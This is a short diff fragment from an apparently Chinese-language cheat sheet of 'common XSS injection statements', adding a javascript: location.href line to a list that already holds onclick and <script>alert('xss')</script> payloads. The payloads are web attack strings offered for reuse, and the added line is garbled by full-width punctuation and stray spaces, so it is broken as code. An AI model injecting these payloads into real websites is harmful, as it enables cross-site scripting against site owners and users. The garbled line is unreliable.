@@ -136,6 +136,8 @@ XSS注入常用语句（整理）
 
 ```
 
+alert（document.domain）" location 。href = " javascript：alert（document.domain）"
+
 "onclick=alert(1)"
 
 <script>alert('xss');</script> //经典语句，哈哈！
